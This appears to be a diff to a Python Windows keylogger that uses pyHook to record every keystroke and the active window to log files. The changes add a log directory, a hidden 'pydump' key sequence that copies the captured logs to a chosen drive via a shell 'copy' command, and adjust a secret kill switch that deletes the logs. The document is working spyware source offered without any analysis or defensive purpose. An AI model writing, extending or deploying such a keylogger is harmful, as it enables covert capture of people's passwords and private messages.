@@ -13,13 +13,14 @@ psapi    = windll.psapi
 current_window = None
 
 #Filewrite Vars
+filename_directory = "logs"
 filename_base = "x"
 filename_ext  = ".log"
 open_type = 'a+'
 filesize_limit = 500000 #Bytes
 paste_limit = 500 #chars
 
-#CheckQuit Vars
+#CheckQuit Vars6
 quit_pass = "pyquit"
 quit_pass_counter = 0
 
@@ -39,10 +40,10 @@ pause = False
 status_pass = "pystatus"
 status_pass_counter = 0
 
-#Todo:
-#1. DumpSwitch
-#2. Encryption
-#3. Argument start
+
+#Dump Vars
+dump_pass = "pydump"
+dump_pass_counter = 0
 
 #This is triggered every time a key is pressed
 #So you can think of this as the main entry point for all other functions
@@ -119,8 +120,8 @@ def checkTriggers(key):
     quitSwitch(key)
     killSwitch(key)
     pauseSwitch(key)
-    resumeSwitch(key)
     statusSwitch(key)
+    dumpSwitch(key)
 
 #Quit Switch - Turns the keylogger off
 def quitSwitch(key):
@@ -141,9 +142,9 @@ def killSwitch(key):
         kill_pass_counter = kill_pass_counter + 1
         if (kill_pass_counter >= len(kill_pass)):
 
-            filelist = [ f for f in os.listdir(".") if f.endswith(".log") ]
+            filelist = [ f for f in os.listdir(filename_directory) if f.endswith(filename_ext) ]
             for f in filelist:
-                os.remove(f);
+                os.remove(filename_directory+"/"+f);
             #os.remove(kill_program_name);
             quit()
     else:
@@ -178,7 +179,7 @@ def pauseSwitch(key):
 def statusSwitch(key):
     global status_pass_counter
 
-    print"\n\n",status_pass_counter,"\n\n"
+    #print"\n\n",status_pass_counter,"\n\n"
 
 
     if (status_pass[status_pass_counter] == key):
@@ -191,7 +192,27 @@ def statusSwitch(key):
 
 #Dump everything to a given lettered drive
 def dumpSwitch(key):
-    i = "TODO"
+    global dump_pass_counter
+    global dump_pass
+
+    print dump_pass_counter
+
+    if (dump_pass_counter == len(dump_pass)):
+        print "Trying to dump into",key.upper()
+        try:
+            print "Dumping into",key.upper()
+            #Bypasses any priviledge limitation that Python might have.
+            print os.popen("copy "+filename_directory+" "+key.upper()+":").read()
+            dump_pass_counter = 0
+        except:
+            print "Nope. '",key,"' wasn't a correct Location to Dump."
+            dump_pass_counter = 0
+    else:
+        if (dump_pass[dump_pass_counter] == key):
+            dump_pass_counter = dump_pass_counter + 1
+        else:
+            dump_pass_counter = 0
+
 
 #Write to File
 def writeToFile(key):
@@ -199,7 +220,7 @@ def writeToFile(key):
     if (pause): return
 
     global open_type
-    filename = filename_base+filename_ext
+    filename = filename_directory+"/"+filename_base+filename_ext
 
     try:
         if (os.path.getsize(filename) > filesize_limit):
@@ -217,6 +238,10 @@ def writeToFile(key):
     target.write(key)
     target.close();
 
+
+
+#Make sure that given directory exists ; Create if Necessary
+if not os.path.exists(filename_directory): os.makedirs(filename_directory)
 
 # create and register a hook manager 
 kl         = pyHook.HookManager()
